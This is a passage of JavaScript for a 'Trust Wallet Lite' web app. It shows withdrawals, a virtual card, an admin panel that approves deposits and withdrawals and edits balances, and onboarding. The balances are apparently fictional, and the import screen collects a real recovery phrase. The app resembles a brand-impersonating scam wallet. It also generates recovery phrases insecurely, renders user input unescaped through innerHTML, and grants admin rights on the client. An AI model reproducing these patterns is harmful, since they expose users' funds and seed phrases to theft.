    document.getElementById('withdrawMinAmount').textContent = DEPOSIT_MINIMUMS[currency] || 10;
    document.getElementById('withdrawFee').textContent = (WITHDRAW_FEES[currency] || 1) + ' ' + currency;
}

function submitWithdrawal() {
    const currency = document.getElementById('withdrawCurrencySymbol')?.textContent || 'TWT';
    const amount = parseFloat(document.getElementById('withdrawAmount')?.value);
    const address = document.getElementById('withdrawAddress')?.value.trim();
    if (!amount || amount <= 0) {
        showToast('Enter amount', 'error');
        return;
    }
    if (!address) {
        showToast('Enter address', 'error');
        return;
    }
    const min = DEPOSIT_MINIMUMS[currency] || 10;
    if (amount < min) {
        showToast(`Minimum withdrawal is ${min} ${currency}`, 'error');
        return;
    }
    const fee = WITHDRAW_FEES[currency] || 1;
    const totalNeeded = amount + fee;
    if ((userData.balances[currency] || 0) < totalNeeded) {
        showToast(`Insufficient balance (need ${totalNeeded} ${currency})`, 'error');
        return;
    }
    userData.balances[currency] -= totalNeeded;
    const req = {
        id: 'wd_' + Date.now(),
        userId: userId,
        currency: currency,
        amount: amount,
        fee: fee,
        address: address,
        status: 'pending',
        timestamp: new Date().toISOString()
    };
    if (!userData.withdrawalRequests) userData.withdrawalRequests = [];
    userData.withdrawalRequests.push(req);
    addTransaction({ ...req, status: 'pending' });
    saveUserData();
    addNotification(`💸 Withdrawal request: ${amount} ${currency} submitted. Waiting for admin approval.`, 'info');
    showToast(`✅ Withdrawal request submitted for ${amount} ${currency}!`, 'success');
    closeModal('withdrawModal');
    updateUI();
    document.getElementById('withdrawAmount').value = '';
    document.getElementById('withdrawAddress').value = '';
}

// ============================================================================
// SECTION 28: TWT PAY VIRTUAL CARD
// ============================================================================

function renderTWTPay() {
    const container = document.getElementById('twtpayContainer');
    if (!container) return;
    const twtBalance = userData.balances.TWT || 0;
    const twtValue = twtBalance * (livePrices.TWT?.price || TWT_PRICE);
    const cardNumber = userData.userId.slice(-4);
    container.innerHTML = `<div class="virtual-card"><div class="card-chip"><i class="fas fa-microchip"></i></div><div class="card-brand">TWT Pay</div><div class="card-number"><span>****</span><span>****</span><span>****</span><span>${cardNumber}</span></div><div class="card-details"><div><div class="label">Card Holder</div><div class="value">${userData.userName || 'TWT User'}</div></div><div><div class="label">Expires</div><div class="value">12/28</div></div></div><div class="card-balance"><div class="balance-label">Available Balance</div><div class="balance-value">${twtBalance.toLocaleString()} TWT</div><div class="balance-usd">≈ $${twtValue.toFixed(2)} USD</div></div><div class="card-footer"><i class="fab fa-visa"></i><span>Virtual Card</span></div></div><div class="card-actions"><button class="card-action-btn" onclick="showTopUpModal()"><i class="fas fa-plus-circle"></i><span>Top Up</span></button><button class="card-action-btn" onclick="showCardSettings()"><i class="fas fa-sliders-h"></i><span>Settings</span></button><button class="card-action-btn" onclick="showCardTransactions()"><i class="fas fa-history"></i><span>History</span></button></div><div class="card-features"><div class="feature"><i class="fas fa-globe"></i><span>Global</span></div><div class="feature"><i class="fas fa-shield-alt"></i><span>Secure</span></div><div class="feature"><i class="fas fa-percent"></i><span>2% Cashback</span></div><div class="feature"><i class="fas fa-exchange-alt"></i><span>Instant Swap</span></div></div>`;
}

function showTopUpModal() {
    showToast('Top up coming soon!', 'info');
}

function showCardSettings() {
    showToast('Card settings coming soon!', 'info');
}

function showCardTransactions() {
    const txs = (userData.transactions || []).filter(t => t.currency === 'TWT' || t.fromCurrency === 'TWT' || t.toCurrency === 'TWT');
    if (txs.length === 0) {
        showToast('No TWT transactions', 'info');
        return;
    }
    let msg = '💳 TWT Card Transactions:\n\n';
    txs.slice(0, 10).forEach(tx => {
        const d = new Date(tx.timestamp).toLocaleDateString();
        if (tx.type === 'send' && tx.currency === 'TWT') msg += `📤 Sent ${tx.amount} TWT (${d})\n`;
        else if (tx.type === 'swap' && tx.toCurrency === 'TWT') msg += `🔄 Received ${tx.toAmount?.toFixed(4)} TWT (${d})\n`;
        else if (tx.type === 'swap' && tx.fromCurrency === 'TWT') msg += `🔄 Sent ${tx.fromAmount} TWT (${d})\n`;
    });
    alert(msg);
}

// ============================================================================
// SECTION 29: SETTINGS
// ============================================================================

function renderSettings() {
    const container = document.getElementById('settingsContainer');
    if (!container) return;
    container.innerHTML = `<div class="settings-list"><div class="settings-item" onclick="showNotifications()"><i class="fas fa-bell"></i><div><div class="label">Notifications</div><div class="desc">View all notifications</div></div><i class="fas fa-chevron-right"></i></div><div class="settings-item" onclick="showTransactionHistory()"><i class="fas fa-history"></i><div><div class="label">Transaction History</div><div class="desc">View all transactions</div></div><i class="fas fa-chevron-right"></i></div><div class="settings-item" onclick="showRecoveryPhrase()"><i class="fas fa-key"></i><div><div class="label">Recovery Phrase</div><div class="desc">View your backup phrase</div></div><i class="fas fa-chevron-right"></i></div><div class="settings-item logout-btn" onclick="logout()"><i class="fas fa-sign-out-alt"></i><div><div class="label">Logout</div><div class="desc">Sign out of your wallet</div></div></div></div><div style="text-align:center;margin-top:24px;"><span style="font-size:10px;">Trust Wallet Lite v1.0</span></div>`;
}

function showRecoveryPhrase() {
    if (!userData.recoveryPhrase) {
        const words = ['apple', 'banana', 'cherry', 'dragon', 'eagle', 'forest', 'green', 'happy', 'island', 'jungle', 'king', 'light'];
        const selected = [];
        for (let i = 0; i < 12; i++) selected.push(words[Math.floor(Math.random() * words.length)]);
        userData.recoveryPhrase = selected.join(' ');
        saveUserData();
    }
    alert(`🔐 Your Recovery Phrase:\n\n${userData.recoveryPhrase}\n\n⚠️ Write this down and keep it safe!`);
}

function showTransactionHistory() {
    const txs = userData.transactions || [];
    if (txs.length === 0) {
        showToast('No transactions yet', 'info');
        return;
    }
    let msg = '📋 Transaction History:\n\n';
    txs.slice(0, 20).forEach(tx => {
        const d = new Date(tx.timestamp).toLocaleDateString();
        const t = new Date(tx.timestamp).toLocaleTimeString();
        if (tx.type === 'send') msg += `📤 SENT: ${tx.amount} ${tx.currency} (${d} ${t})\n`;
        else if (tx.type === 'swap') msg += `🔄 SWAP: ${tx.fromAmount} ${tx.fromCurrency} → ${tx.toAmount?.toFixed(4)} ${tx.toCurrency} (${d} ${t})\n`;
        else if (tx.type === 'referral_reward') msg += `🎉 REFERRAL: +${tx.amount} ${tx.currency} (${d} ${t})\n`;
    });
    alert(msg);
}

function logout() {
    if (confirm('Logout?')) {
        localStorage.removeItem(`twt_user_${userId}`);
        userData = null;
        showOnboarding();
    }
}

// ============================================================================
// SECTION 30: HISTORY
// ============================================================================

function renderHistory(filter = 'all') {
    const container = document.getElementById('historyList');
    if (!container) return;
    currentHistoryFilter = filter;
    let transactions = loadLocalTransactions();
    if (filter !== 'all') transactions = transactions.filter(tx => tx.type === filter);
    if (transactions.length === 0) {
        container.innerHTML = '<div class="empty-state"><i class="fa-regular fa-clock"></i><p>No transactions yet</p></div>';
        return;
    }
    container.innerHTML = transactions.map(tx => {
        const d = new Date(tx.timestamp);
        const fd = d.toLocaleDateString() + ' ' + d.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
        let icon = 'fa-circle-down', typeClass = 'deposit', typeText = 'Deposit';
        if (tx.type === 'withdraw') { icon = 'fa-circle-up'; typeClass = 'withdraw'; typeText = 'Withdrawal'; }
        else if (tx.type === 'swap') { icon = 'fa-arrow-right-arrow-left'; typeClass = 'swap'; typeText = 'Swap'; }
        else if (tx.type === 'referral_reward') { icon = 'fa-users'; typeClass = 'referral'; typeText = 'Referral'; }
        let statusClass = 'completed', statusText = 'Completed';
        if (tx.status === 'pending') { statusClass = 'pending'; statusText = 'Pending'; }
        return `<div class="history-item"><div class="history-item-header"><div class="history-type ${typeClass}"><i class="fa-regular ${icon}"></i><span>${typeText}</span></div><span class="history-status ${statusClass}">${statusText}</span></div><div class="history-details"><span class="history-amount">${tx.amount} ${tx.currency}</span><span class="history-date">${fd}</span></div>${tx.details ? `<div style="font-size:11px;margin-top:5px;">${tx.details}</div>` : ''}</div>`;
    }).join('');
}

function showHistory() {
    const modal = document.getElementById('historyModal');
    if (modal) {
        modal.classList.add('show');
        renderHistory('all');
    }
}

function filterHistory(filter) {
    document.querySelectorAll('.history-tab').forEach(t => t.classList.remove('active'));
    if (event.target) event.target.classList.add('active');
    renderHistory(filter);
}

// ============================================================================
// SECTION 31: ADMIN PANEL
// ============================================================================

function showAdminPanel() {
    if (!isAdmin) {
        showToast('Access denied', 'error');
        return;
    }
    document.getElementById('adminPanel').classList.add('show');
    refreshAdminPanel();
}

function closeAdminPanel() {
    document.getElementById('adminPanel').classList.remove('show');
}

function refreshAdminPanel() {
    const tab = document.querySelector('.admin-tab.active')?.textContent?.toLowerCase().includes('deposit') ? 'deposits' : 'withdrawals';
    showAdminTab(tab);
}

function showAdminTab(tab) {
    document.querySelectorAll('.admin-tab').forEach(t => t.classList.remove('active'));
    if (event.target) event.target.classList.add('active');
    const content = document.getElementById('adminContent');
    if (!content) return;
    if (tab === 'deposits') {
        const deposits = userData?.depositRequests?.filter(d => d.status === 'pending') || [];
        if (deposits.length === 0) content.innerHTML = '<div class="empty-state">No pending deposits</div>';
        else content.innerHTML = deposits.map(d => `<div class="admin-transaction-card"><div class="admin-tx-header"><span class="admin-tx-type deposit">DEPOSIT</span><span class="admin-tx-status pending">Pending</span></div><p><strong>User:</strong> ${d.userId}</p><p><strong>Amount:</strong> ${d.amount} ${d.currency}</p><p><strong>TX Hash:</strong> ${d.txHash?.substring(0, 20) || 'N/A'}</p><div class="admin-tx-actions"><button class="admin-approve-btn" onclick="approveDeposit('${d.id}')">Approve</button><button class="admin-reject-btn" onclick="rejectDeposit('${d.id}')">Reject</button></div></div>`).join('');
    } else if (tab === 'withdrawals') {
        const withdrawals = userData?.withdrawalRequests?.filter(w => w.status === 'pending') || [];
        if (withdrawals.length === 0) content.innerHTML = '<div class="empty-state">No pending withdrawals</div>';
        else content.innerHTML = withdrawals.map(w => `<div class="admin-transaction-card"><div class="admin-tx-header"><span class="admin-tx-type withdraw">WITHDRAWAL</span><span class="admin-tx-status pending">Pending</span></div><p><strong>User:</strong> ${w.userId}</p><p><strong>Amount:</strong> ${w.amount} ${w.currency}</p><p><strong>Address:</strong> ${w.address?.substring(0, 20)}...</p><p><strong>Fee:</strong> ${w.fee} ${w.currency}</p><div class="admin-tx-actions"><button class="admin-approve-btn" onclick="approveWithdrawal('${w.id}')">Approve</button><button class="admin-reject-btn" onclick="rejectWithdrawal('${w.id}')">Reject</button></div></div>`).join('');
    } else if (tab === 'users') {
        content.innerHTML = `<div style="padding:20px;"><input type="text" id="adminUserIdInput" placeholder="Enter User ID" class="modal-input"><button onclick="adminLoadUser()" class="btn-primary" style="width:100%;margin-top:10px;">Search User</button><div id="adminUserStats"></div></div>`;
    } else if (tab === 'stats') {
        content.innerHTML = `<div class="stats-grid"><div class="stat-card"><h3>TWT Price</h3><div class="stat-value">$${(livePrices.TWT?.price || TWT_PRICE).toFixed(4)}</div></div><div class="stat-card"><h3>Your TWT</h3><div class="stat-value">${(userData?.balances.TWT || 0).toLocaleString()}</div></div><div class="stat-card"><h3>Total Referrals</h3><div class="stat-value">${userData?.referralCount || 0}</div></div><div class="stat-card"><h3>Pending Deposits</h3><div class="stat-value">${userData?.depositRequests?.filter(d => d.status === 'pending').length || 0}</div></div></div>`;
    }
}

function approveDeposit(id) {
    const d = userData.depositRequests?.find(x => x.id === id);
    if (d) {
        d.status = 'approved';
        userData.balances[d.currency] = (userData.balances[d.currency] || 0) + d.amount;
        addNotification(`✅ Deposit of ${d.amount} ${d.currency} approved!`, 'success');
        saveUserData();
        updateUI();
        refreshAdminPanel();
        showToast('Deposit approved', 'success');
    }
}

function rejectDeposit(id) {
    const d = userData.depositRequests?.find(x => x.id === id);
    if (d) {
        d.status = 'rejected';
        addNotification(`❌ Deposit of ${d.amount} ${d.currency} rejected.`, 'error');
        saveUserData();
        refreshAdminPanel();
        showToast('Deposit rejected', 'warning');
    }
}

function approveWithdrawal(id) {
    const w = userData.withdrawalRequests?.find(x => x.id === id);
    if (w) {
        w.status = 'approved';
        addNotification(`✅ Withdrawal of ${w.amount} ${w.currency} approved!`, 'success');
        saveUserData();
        updateUI();
        refreshAdminPanel();
        showToast('Withdrawal approved', 'success');
    }
}

function rejectWithdrawal(id) {
    const w = userData.withdrawalRequests?.find(x => x.id === id);
    if (w) {
        w.status = 'rejected';
        userData.balances[w.currency] = (userData.balances[w.currency] || 0) + w.amount + (w.fee || 0);
        addNotification(`❌ Withdrawal of ${w.amount} ${w.currency} rejected.`, 'error');
        saveUserData();
        updateUI();
        refreshAdminPanel();
        showToast('Withdrawal rejected', 'warning');
    }
}

function adminLoadUser() {
    const uid = document.getElementById('adminUserIdInput')?.value.trim();
    const stats = document.getElementById('adminUserStats');
    if (!uid) {
        showToast('Enter User ID', 'error');
        return;
    }
    if (uid === userId) {
        stats.innerHTML = `<div class="admin-transaction-card"><h4>User: ${userData.userName}</h4><p><strong>ID:</strong> ${userData.userId}</p><p><strong>Referrals:</strong> ${userData.referralCount}</p><p><strong>TWT:</strong> ${userData.balances.TWT?.toLocaleString()}</p><p><strong>USDT:</strong> $${userData.balances.USDT?.toFixed(2)}</p><div style="display:flex;gap:10px;margin-top:16px;"><button onclick="adminAddBalance()" class="admin-approve-btn">Add Balance</button><button onclick="adminRemoveBalance()" class="admin-reject-btn">Remove Balance</button></div></div>`;
    } else {
        stats.innerHTML = '<div style="padding:20px;text-align:center;">User not found</div>';
    }
}

function adminAddBalance() {
    const cur = prompt('Currency (TWT, USDT):', 'TWT');
    if (!cur) return;
    const amount = parseFloat(prompt(`Amount to ADD (${cur}):`, '0'));
    if (isNaN(amount) || amount <= 0) return;
    userData.balances[cur] = (userData.balances[cur] || 0) + amount;
    saveUserData();
    updateUI();
    showToast(`✅ Added ${amount} ${cur}`, 'success');
    adminLoadUser();
}

function adminRemoveBalance() {
    const cur = prompt('Currency (TWT, USDT):', 'TWT');
    if (!cur) return;
    const amount = parseFloat(prompt(`Amount to REMOVE (${cur}):`, '0'));
    if (isNaN(amount) || amount <= 0) return;
    userData.balances[cur] = Math.max(0, (userData.balances[cur] || 0) - amount);
    saveUserData();
    updateUI();
    showToast(`✅ Removed ${amount} ${cur}`, 'success');
    adminLoadUser();
}

// ============================================================================
// SECTION 32: CURRENCY SELECTOR
// ============================================================================

function showCurrencySelector(context) {
    currentCurrencyContext = context;
    const modal = document.getElementById('currencySelectorModal');
    const list = document.getElementById('currencyList');
    list.innerHTML = ALL_ASSETS.map(asset => `<div class="currency-list-item" onclick="selectCurrency('${asset.symbol}')"><img src="${getCurrencyIcon(asset.symbol)}"><div><h4>${asset.name}</h4><p>${asset.symbol}</p></div></div>`).join('');
    modal.classList.add('show');
}

function showSwapCurrencySelector(context) {
    currentSwapContext = context;
    const modal = document.getElementById('currencySelectorModal');
    const list = document.getElementById('currencyList');
    list.innerHTML = ALL_ASSETS.map(asset => `<div class="currency-list-item" onclick="selectSwapCurrency('${asset.symbol}')"><img src="${getCurrencyIcon(asset.symbol)}"><div><h4>${asset.name}</h4><p>${asset.symbol}</p></div></div>`).join('');
    modal.classList.add('show');
}

function selectCurrency(symbol) {
    if (currentCurrencyContext === 'send') {
        document.getElementById('sendCurrencySymbol').textContent = symbol;
        document.getElementById('sendCurrencyIcon').src = getCurrencyIcon(symbol);
    } else if (currentCurrencyContext === 'receive') {
        document.getElementById('receiveCurrencySymbol').textContent = symbol;
        document.getElementById('receiveCurrencyIcon').src = getCurrencyIcon(symbol);
        updateReceiveAddress();
    } else if (currentCurrencyContext === 'deposit') {
        document.getElementById('depositCurrencySymbol').textContent = symbol;
        document.getElementById('depositCurrencyIcon').src = getCurrencyIcon(symbol);
        updateDepositInfo();
    } else if (currentCurrencyContext === 'withdraw') {
        document.getElementById('withdrawCurrencySymbol').textContent = symbol;
        document.getElementById('withdrawCurrencyIcon').src = getCurrencyIcon(symbol);
        updateWithdrawInfo();
    }
    closeModal('currencySelectorModal');
}

function selectSwapCurrency(symbol) {
    if (currentSwapContext === 'from') {
        document.getElementById('swapFromSymbol').textContent = symbol;
        document.getElementById('swapFromIcon').src = getCurrencyIcon(symbol);
        updateSwapBalances();
        calculateSwap();
    } else if (currentSwapContext === 'to') {
        document.getElementById('swapToSymbol').textContent = symbol;
        document.getElementById('swapToIcon').src = getCurrencyIcon(symbol);
        updateSwapBalances();
        calculateSwap();
    }
    closeModal('currencySelectorModal');
}

function filterCurrencies() {
    const search = document.getElementById('currencySearch')?.value.toLowerCase() || '';
    document.querySelectorAll('.currency-list-item').forEach(item => {
        item.style.display = item.textContent.toLowerCase().includes(search) ? 'flex' : 'none';
    });
}

// ============================================================================
// SECTION 33: NAVIGATION & UI
// ============================================================================

function setupNavbar() {
    document.querySelectorAll('.nav-item').forEach(btn => {
        btn.addEventListener('click', () => switchTab(btn.dataset.tab));
    });
}

function switchTab(tab) {
    currentTab = tab;
    document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
    document.querySelector(`.nav-item[data-tab="${tab}"]`)?.classList.add('active');
    document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
    document.getElementById(`${tab}Section`)?.classList.add('active');
    if (tab === 'wallet') renderWallet();
    else if (tab === 'swap') renderSwap();
    else if (tab === 'referral') renderReferral();
    else if (tab === 'twtpay') renderTWTPay();
    else if (tab === 'settings') renderSettings();
    showRandomSticker();
}

function updateUI() {
    if (currentTab === 'wallet') renderWallet();
    else if (currentTab === 'swap') renderSwap();
    else if (currentTab === 'referral') renderReferral();
    else if (currentTab === 'twtpay') renderTWTPay();
    else if (currentTab === 'settings') renderSettings();
    updateTotalBalance();
    updateNotificationBadge();
}

// ============================================================================
// SECTION 34: ONBOARDING
// ============================================================================

function showOnboarding() {
    const onboarding = document.getElementById('onboardingScreen');
    const main = document.getElementById('mainContent');
    if (onboarding) onboarding.style.display = 'flex';
    if (main) main.style.display = 'none';
}

function showMainApp() {
    const onboarding = document.getElementById('onboardingScreen');
    const main = document.getElementById('mainContent');
    if (onboarding) onboarding.style.display = 'none';
    if (main) main.style.display = 'block';
    switchTab('wallet');
}

function createNewWallet() {
    const btn = document.getElementById('createWalletBtn');
    const originalText = btn.innerHTML;
    btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Creating...';
    btn.disabled = true;
    setTimeout(() => {
        const newUserId = 'user_' + Math.random().toString(36).substr(2, 9);
        userData = {
            userId: newUserId,
            userName: 'User',
            referralCode: generateReferralCode(),
            balances: { TWT: WELCOME_BONUS, USDT: 0, BNB: 0, BTC: 0, ETH: 0, SOL: 0, TRX: 0 },
            referralCount: 0,
            referralMilestones: REFERRAL_MILESTONES.map(m => ({ ...m, claimed: false })),
            notifications: [],
            transactions: [],
            depositRequests: [],
            withdrawalRequests: [],
            totalTwtEarned: WELCOME_BONUS,
            totalUsdtEarned: 0,
            createdAt: new Date().toISOString()
        };
        currentUser = newUserId;
        isAdmin = currentUser === ADMIN_ID;
        saveUserData();
        showMainApp();
        updateUI();
        checkAdminAndAddCrown();
        processReferral();
        showToast(`🎉 Welcome! You received ${WELCOME_BONUS} TWT!`, 'success');
        btn.innerHTML = originalText;
        btn.disabled = false;
    }, 500);
}

function showImportModal() {
    document.getElementById('importModal').classList.add('show');
}

function closeImportModal() {
    document.getElementById('importModal').classList.remove('show');
    document.getElementById('importPhrase').value = '';
}

function importWallet() {
    const phrase = document.getElementById('importPhrase').value.trim();
    if (!phrase) {
        showToast('Enter recovery phrase', 'error');
        return;
    }
    const btn = document.getElementById('confirmImportBtn');
    const originalText = btn.innerHTML;
    btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Importing...';
    btn.disabled = true;
    setTimeout(() => {
        const newUserId = 'user_' + Math.random().toString(36).substr(2, 9);
        userData = {
            userId: newUserId,
            userName: 'User',
            referralCode: generateReferralCode(),
            recoveryPhrase: phrase,
            balances: { TWT: WELCOME_BONUS, USDT: 0, BNB: 0, BTC: 0, ETH: 0, SOL: 0, TRX: 0 },
            referralCount: 0,
            referralMilestones: REFERRAL_MILESTONES.map(m => ({ ...m, claimed: false })),
            notifications: [],
            transactions: [],
            depositRequests: [],
            withdrawalRequests: [],
            totalTwtEarned: WELCOME_BONUS,
            totalUsdtEarned: 0,
            createdAt: new Date().toISOString()
        };
        currentUser = newUserId;
        isAdmin = currentUser === ADMIN_ID;
        saveUserData();
        closeImportModal();
        showMainApp();
        updateUI();
        checkAdminAndAddCrown();
        processReferral();
        showToast(`🎉 Wallet imported! You received ${WELCOME_BONUS} TWT!`, 'success');
        btn.innerHTML = originalText;
        btn.disabled = false;
    }, 500);
}

// ============================================================================
// SECTION 35: INITIALIZATION
// ============================================================================

document.addEventListener('DOMContentLoaded', async () => {
    setTimeout(() => {
        const splash = document.getElementById('splashScreen');
        if (splash) splash.classList.add('hidden');
    }, 1500);
    await fetchLivePrices();
    setInterval(fetchLivePrices, 1800000);
    if (loadUserData()) {
        showMainApp();
        updateUI();
        checkAdminAndAddCrown();
        processReferral();
    } else {
        showOnboarding();
    }
    setupNavbar();
    window.addEventListener('scroll', () => {
        const btn = document.getElementById('scrollTopBtn');
        if (btn) btn.classList.toggle('show', window.scrollY > 300);
    });
    setTimeout(() => {
        const notifBtn = document.getElementById('notificationBtn');
        if (notifBtn) {
            const newBtn = notifBtn.cloneNode(true);
            notifBtn.parentNode?.replaceChild(newBtn, notifBtn);
            newBtn.addEventListener('click', showNotifications);
        }
    }, 1000);
    setTimeout(() => showRandomSticker(), 500);
});

// ============================================================================
// SECTION 36: EXPORT ALL FUNCTIONS (احترافي)
// ============================================================================

window.showWallet = () => switchTab('wallet');
window.showSwap = () => switchTab('swap');
window.showReferral = () => switchTab('referral');
window.showTWTPay = () => switchTab('twtpay');
window.showSettings = () => switchTab('settings');
window.showSendModal = showSendModal;
window.showReceiveModal = showReceiveModal;
window.showSwapModal = showSwapModal;
window.showDepositModal = showDepositModal;
window.showWithdrawModal = showWithdrawModal;
window.showHistory = showHistory;
window.showNotifications = showNotifications;
window.showAdminPanel = showAdminPanel;
window.closeModal = closeModal;
window.closeAdminPanel = closeAdminPanel;
window.sendTransaction = sendTransaction;
window.confirmSwap = confirmSwap;
window.submitDeposit = submitDeposit;
window.submitWithdrawal = submitWithdrawal;
window.copyAddress = copyAddress;
window.copyDepositAddress = copyDepositAddress;
window.copyReferralLink = copyReferralLink;
window.shareReferral = shareReferral;
window.refreshPrices = refreshPrices;
window.scrollToTop = scrollToTop;
window.setSwapPercentage = setSwapPercentage;
window.calculateSwap = calculateSwap;
window.updateSwapRate = updateSwapRate;
window.claimReferralMilestone = claimReferralMilestone;
window.showTransactionHistory = showTransactionHistory;
window.showRecoveryPhrase = showRecoveryPhrase;
window.logout = logout;
window.showTopUpModal = showTopUpModal;
window.showCardSettings = showCardSettings;
window.showCardTransactions = showCardTransactions;
window.filterHistory = filterHistory;
window.showCurrencySelector = showCurrencySelector;
window.showSwapCurrencySelector = showSwapCurrencySelector;
window.selectCurrency = selectCurrency;
window.selectSwapCurrency = selectSwapCurrency;
window.filterCurrencies = filterCurrencies;
window.showAdminTab = showAdminTab;
window.refreshAdminPanel = refreshAdminPanel;
window.approveDeposit = approveDeposit;
window.rejectDeposit = rejectDeposit;
window.approveWithdrawal = approveWithdrawal;
window.rejectWithdrawal = rejectWithdrawal;
window.adminLoadUser = adminLoadUser;
window.adminAddBalance = adminAddBalance;
window.adminRemoveBalance = adminRemoveBalance;
window.markNotificationRead = markNotificationRead;
window.clearReadNotifications = clearReadNotifications;
window.clearAllNotifications = clearAllNotifications;
window.showToast = showToast;
window.copyToClipboard = copyToClipboard;
window.showAssetDetails = showAssetDetails;

console.log("✅ Trust Wallet Lite v1.0 - Fully Loaded!");
console.log("✅ Features: Wallet, Swap (DEX), Referral (TWT Rewards), TWT Pay Card, Admin Panel");
console.log("✅ 8 Referral Milestones: 5, 10, 25, 50, 100, 250, 500, 1000 referrals");
console.log("✅ 7 Cryptocurrencies: TWT, USDT, BNB, BTC, ETH, SOL, TRX");
console.log("✅ Admin ID: " + ADMIN_ID);
